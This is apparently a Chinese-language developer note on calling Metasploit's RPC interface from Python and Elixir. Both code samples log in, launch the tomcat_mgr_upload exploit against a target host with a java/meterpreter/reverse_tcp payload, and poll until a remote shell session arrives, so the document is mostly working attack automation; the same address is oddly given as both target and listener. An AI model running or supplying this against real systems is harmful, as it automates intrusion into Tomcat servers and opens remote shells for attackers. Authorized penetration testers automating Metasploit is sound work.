# rpc

## 说明

远程调用

## 例子

### python

依赖

```sh
pymetasploit3
```

代码

```python
import pymetasploit3.msfrpc as msfrpc
import time

if __name__ == "__main__":
    client = msfrpc.MsfRpcClient(
        "123456", username="mmc", server="127.0.0.1", port=55553, ssl=False
    )

    # exploit 为攻击方式，一般需要配置 RHOST 等目标服务器的参数
    # handler 为 exploit 的一种，攻击已经被其它方式做掉了，只需要等待
    exploit = client.modules.use("exploit", "exploit/multi/http/tomcat_mgr_upload")
    exploit["RHOSTS"] = "192.168.1.100"
    exploit["RPORT"] = 8080

    # payload 代表具体做什么，如果是反弹 shell, 则配置 LHOST 之类的本地监听的参数
    payload = client.modules.use("payload", "java/meterpreter/reverse_tcp")
    payload["LHOST"] = "192.168.1.100"
    payload["LPORT"] = 4444

    result = exploit.execute(payload=payload)

    if result.get("job_id") is None:
        print("handler 启动失败:", result)
        exit()

    print("handler 已启动，job", result["job_id"], "在等反弹连接")

    # 等 5 秒
    for _ in range(5):
        time.sleep(1)
        sessions = client.sessions.list
        if sessions:
            for sid, info in sessions.items():
                print(
                    f"成功: 收到 session {sid} ({info['type']}) 来自 {info['session_host']}"
                )
            break
    else:
        print("失败: 未收到 session（目标不可达或 exploit 无效）")
```

### elixir

依赖

```elixir
{:msgpax, "~> 2.3"},
{:finch, "~> 0.16"}
```

msf_rpc.ex

```elixir
defmodule MsfRpc do
  require Logger

  @default_url "http://127.0.0.1:55553/api/"
  @msf_finch MsfFinch

  def login(user, pass, url \\ @default_url) do
    body = Msgpax.pack!(["auth.login", user, pass])

    headers = [
      {"content-type", "binary/message-pack"},
      {"accept", "binary/message-pack"}
    ]

    Finch.start_link(name: @msf_finch)
    req = Finch.build(:post, url, headers, body)

    case Finch.request(req, @msf_finch) do
      {:ok, %Finch.Response{status: 200, body: body}} ->
        decoded = Msgpax.unpack!(body)

        cond do
          is_map(decoded) and Map.has_key?(decoded, "token") -> {:ok, decoded["token"]}
          is_map(decoded) and Map.has_key?(decoded, "result") -> {:ok, decoded["result"]}
          is_map(decoded) and Map.has_key?(decoded, "error") -> {:error, decoded["error"]}
          true -> {:error, decoded}
        end

      {:ok, resp} ->
        {:error, resp}

      {:error, reason} ->
        {:error, reason}
    end
  end

  def call(token, method, params \\ [], url \\ @default_url) do
    body = Msgpax.pack!([method, token | params])

    headers = [
      {"content-type", "binary/message-pack"},
      {"accept", "binary/message-pack"}
    ]

    req = Finch.build(:post, url, headers, body)

    case Finch.request(req, @msf_finch) do
      {:ok, %Finch.Response{status: 200, body: body}} ->
        decoded = Msgpax.unpack!(body)

        cond do
          is_map(decoded) and Map.has_key?(decoded, "error") -> {:error, decoded["error"]}
          true -> {:ok, decoded}
        end

      {:ok, resp} ->
        {:error, resp}

      {:error, reason} ->
        {:error, reason}
    end
  end

  def execute_and_wait(token, exploit_name, opts, url \\ @default_url, timeout \\ 5) do
    case call(token, "module.execute", ["exploit", exploit_name, opts], url) do
      {:ok, result} ->
        if Map.get(result, "job_id") != nil do
          Logger.info("handler 已启动，job #{result["job_id"]} 等待反弹连接")
          wait_session(token, url, timeout)
        else
          Logger.warning("handler 启动失败: #{inspect(result)}")
        end

      {:error, err} ->
        Logger.error("execute error: #{inspect(err)}")
    end
  end

  def wait_session(token, url \\ @default_url, timeout \\ 5) do
    1..timeout
    |> Enum.reduce_while(nil, fn _, _ ->
      Process.sleep(1000)

      case call(token, "session.list", [], url) do
        {:ok, sessions} when sessions != %{} -> {:halt, sessions}
        _ -> {:cont, nil}
      end
    end)
    |> case do
      nil -> Logger.warning("失败: 未收到 session（目标不可达或 exploit 无效）")
      sessions -> print_sessions(sessions)
    end
  end

  defp print_sessions(sessions) do
    for {sid, info} <- sessions do
      Logger.info("成功: 收到 session #{sid} (#{info["type"]}) 来自 #{info["session_host"]}")
    end
  end
end
```

demo.ex

```elixir
defmodule Demo do
  require Logger

  @user "mmc"
  @pass "123456"
  @msf_url "http://127.0.0.1:55553/api/"

  def demo do
    with {:ok, token} <- MsfRpc.login(@user, @pass, @msf_url) do
      exploit = "exploit/multi/http/tomcat_mgr_upload"

      exploit_opts = %{
        "RHOSTS" => "192.168.1.100",
        "RPORT" => 8080,
        "TARGETURI" => "/manager/html"
      }

      payload = "java/meterpreter/reverse_tcp"

      payload_opts = %{
        "LHOST" => "192.168.1.100",
        "LPORT" => 4444
      }

      opts =
        Map.merge(
          exploit_opts,
          Map.put(payload_opts, "PAYLOAD", payload)
        )

      MsfRpc.execute_and_wait(token, exploit, opts, @msf_url, 3)
    else
      {:error, err} -> Logger.error("login error: #{inspect(err)}")
    end
  end
end
```
